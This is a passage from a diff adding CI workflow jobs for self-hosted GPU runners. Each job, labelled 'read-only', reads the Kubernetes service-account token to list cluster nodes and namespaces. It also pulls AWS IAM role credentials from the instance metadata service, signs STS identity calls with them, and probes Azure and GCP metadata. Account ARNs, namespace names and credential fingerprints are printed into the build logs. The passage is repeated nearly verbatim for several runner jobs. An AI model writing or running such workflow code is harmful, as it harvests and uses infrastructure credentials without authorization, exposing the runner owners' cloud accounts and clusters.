+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  b200k-b:
+    runs-on: 4-gpu-b200-kernel
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: b200k-b
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  mi300-8-a:
+    runs-on: linux-mi300-8gpu-sglang
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: mi300-8-a
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  mi300-8-b:
+    runs-on: linux-mi300-8gpu-sglang
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: mi300-8-b
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
